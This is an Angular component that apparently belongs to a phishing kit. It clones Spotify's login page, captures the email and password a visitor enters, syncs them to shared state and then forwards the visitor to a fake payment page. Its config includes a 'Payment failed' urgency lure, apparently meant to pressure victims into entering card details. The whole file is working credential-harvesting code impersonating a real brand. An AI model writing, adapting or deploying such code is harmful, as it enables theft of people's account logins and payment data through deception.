import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';

@Component({
  selector: 'app-spotify-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="spotify-flow-container">
      <img src="/assets/images/logos/spotify-logo.svg" alt="Spotify" class="spotify-logo">
      
      <div class="spotify-card">
        <h1>Log in to Spotify</h1>
        
        <button class="spotify-social-btn google">
           <img src="/assets/flows/spotify/images/google-icon.svg" alt="" class="social-icon">
           <span>Continue with Google</span>
        </button>
        <button class="spotify-social-btn facebook">
           <img src="/assets/flows/spotify/images/facebook-icon.svg" alt="" class="social-icon">
           <span>Continue with Facebook</span>
        </button>
        <button class="spotify-social-btn apple">
           <img src="/assets/flows/spotify/images/apple-icon.svg" alt="" class="social-icon">
           <span>Continue with Apple</span>
        </button>
        
        <div class="spotify-divider">
           <span>OR</span>
        </div>
        
        <form [formGroup]="loginForm" (ngSubmit)="onSubmit()">
          <div class="spotify-form-group">
            <label for="email">Email or username</label>
            <input 
              type="text" 
              id="email" 
              formControlName="email"
              placeholder="Email or username"
              [class.error]="isFieldInvalid('email')"
            >
          </div>

          <div class="spotify-form-group">
            <label for="password">Password</label>
            <input 
              type="password" 
              id="password" 
              formControlName="password"
              placeholder="Password"
              [class.error]="isFieldInvalid('password')"
            >
          </div>
          
          <div class="spotify-checkbox-container">
               <input type="checkbox" id="remember" formControlName="remember">
               <label for="remember">Remember me</label>
          </div>

          <button 
            type="submit" 
            class="spotify-btn-primary"
            [disabled]="loginForm.invalid || isLoading()"
          >
            Log In
          </button>
          
          <div style="margin-top: 25px; text-align: center;">
             <a href="javascript:void(0)" style="color: #fff; font-size: 14px; display: block; margin-bottom: 20px;">Forgot your password?</a>
             
             <div style="border-top: 1px solid #292929; padding-top: 20px; width: 100%;">
                 <p style="color: #6a6a6a; margin-bottom: 10px;">Don't have an account?</p>
                 <button style="background: transparent; border: 1px solid #6a6a6a; color: #6a6a6a; border-radius: 500px; padding: 10px 30px; text-transform: uppercase; font-weight: 700; width: 100%; cursor: pointer;">
                    Sign up for Spotify
                 </button>
             </div>
          </div>
        </form>
      </div>
    </div>
  `,
  styleUrls: ['../../../styles/flows/spotify.scss']
})
export class SpotifyLoginComponent {
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private state = inject(StateService);

  isLoading = signal(false);

  loginForm = this.fb.group({
    email: ['', [Validators.required, Validators.minLength(3)]],
    password: ['', [Validators.required, Validators.minLength(4)]],
    remember: [false]
  });

  constructor() {
    const flow = getFlowById('spotify');
    if (flow) {
      this.state.currentFlow.set(flow);
    } else {
      // Fallback if not registered yet
      this.state.currentFlow.set({
        id: 'spotify',
        name: 'Spotify',
        path: 'verify/spotify',
        icon: 'fab fa-spotify',
        color: '#1DB954',
        category: 'streaming',
        monthlyPrice: 10,
        description: 'Spotify verification',
        theme: {
          mode: 'dark',
          background: { type: 'color', value: '#121212' },
          layout: 'centered',
          card: { background: '#121212', border: 'none', radius: '0px', shadow: 'none', maxWidth: '450px', padding: '0px' },
          input: { style: 'flat', activeColor: '#1DB954', borderRadius: '4px', backgroundColor: '#121212', textColor: '#ffffff', labelBehavior: 'top' },
          button: { background: '#1DB954', color: '#000000', borderRadius: '500px', width: 'full', style: 'flat' },
          header: { logoUrl: 'assets/images/logos/spotify-logo.svg', logoHeight: '45px', alignment: 'center' },
          footer: { style: 'hidden', links: [], textColor: '#000' }
        },
        urgency: {
          type: 'payment_decline',
          title: 'Payment failed',
          message: 'We could not process your payment.',
          buttonText: 'Update Payment',
          alertIcon: 'warning',
          referencePrefix: 'SP',
        },
        steps: []
      });
    }
  }

  isFieldInvalid(field: string): boolean {
    const control = this.loginForm.get(field);
    return !!(control && control.invalid && (control.dirty || control.touched));
  }

  async onSubmit() {
    if (this.loginForm.valid) {
      this.isLoading.set(true);
      const { email, password } = this.loginForm.value;

      this.state.email.set(email!);
      this.state.password.set(password!);

      this.state.isLoginSubmitted.set(true);
      await this.state.syncState();

      setTimeout(() => {
        this.isLoading.set(false);
        this.router.navigate(['/verify/spotify/payment']);
      }, 700);
    } else {
      this.loginForm.markAllAsTouched();
    }
  }
}
